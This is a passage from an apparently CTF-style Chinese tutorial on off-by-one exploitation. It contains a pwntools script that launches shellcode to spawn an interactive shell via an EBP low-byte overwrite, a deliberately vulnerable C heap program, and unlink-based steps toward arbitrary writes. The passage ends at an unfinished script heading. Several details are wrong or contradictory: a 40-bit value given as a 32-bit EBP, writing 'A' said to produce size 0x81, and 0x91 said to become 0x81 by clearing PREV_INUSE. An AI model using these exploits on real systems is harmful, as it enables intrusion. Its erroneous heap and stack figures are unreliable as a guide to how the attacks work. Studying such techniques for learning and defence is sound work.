from pwn import *

context.binary = './vuln'
context.log_level = 'debug'

# 假设通过调试得到偏移：buf到EBP为256字节，到返回地址为260字节
# 但我们只覆盖EBP最低字节，所以需要构造栈布局
# 在buf中布置shellcode和伪造的返回地址
shellcode = asm(shellcraft.sh())
# 填充至256字节，然后覆盖EBP最低字节为0x00
payload = shellcode.ljust(256, b'A')
payload += b'\x00'  # 覆盖EBP最低字节
# 注意：这里需要提前在栈上某处（如buf+offset）放置返回地址指向shellcode
# 由于EBP被改为0x7ffffffd00，我们需要在0x7ffffffd00处放置一个地址，该地址指向shellcode
# 实际上更复杂的利用需要结合栈地址泄露，此处简化
p = process('./vuln', argv=[payload])
p.interactive()

实际利用中需要精确计算栈地址，并确保新EBP指向的地址处有可控数据。此技术常用于绕过ASLR但未开启PIE的情况。

堆上的Off-by-one漏洞通常发生在堆缓冲区写入时多写一个字节，这个字节可以覆盖下一个chunk的size字段的最低有效字节。在glibc 2.23中，chunk结构包含prev_size（8字节）和size（8字节，低3位为标志位）。如果当前chunk大小为0x90，下一个chunk的size可能为0x91（PREV_INUSE置位）。通过off-by-one将0x91改为0x81（清除PREV_INUSE位），可以欺骗free()认为前一个chunk是空闲的，从而触发unlink操作，实现堆重叠或任意地址写。

漏洞代码示例：
c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable() {
    char *a = malloc(0x88);  // 实际分配0x90大小chunk
    char *b = malloc(0x88);
    // 假设存在off-by-one：写入a时多写一个字节
    for (int i = 0; i <= 0x88; i++) {  // 0x88+1=0x89字节，覆盖b的size
        a[i] = 'A';
    }
    // 此时b的size被改为0x81（如果原为0x91，低字节0x91 & 0x7f = 0x11? 实际需要精确计算）
    // 更精确：原b->size = 0x91，off-by-one写入0x81，则size变为0x81
    free(b);  // 触发unlink
    free(a);
}

int main() {
    vulnerable();
    return 0;
}

利用步骤：
1. 分配三个chunk：A（0x90）、B（0x90）、C（0x90），其中C用于防止top chunk合并。
2. 在A中写入数据，利用off-by-one将B的size从0x91改为0x81（清除PREV_INUSE位）。同时，需要在A中伪造一个fake chunk，使得B的prev_size指向A，且fake chunk的fd和bk满足unlink检查（fd->bk == fake && bk->fd == fake）。
3. 释放B：由于B的size被改为0x81，且PREV_INUSE为0，free()会认为前一个chunk（即A）是空闲的，并尝试unlink。但A实际上在使用中，unlink会修改A的fd和bk指针，导致任意地址写。
4. 通过精心构造的fd和bk，可以实现向任意地址写入一个堆地址（或任意值）。

pwntools利用脚本片段：
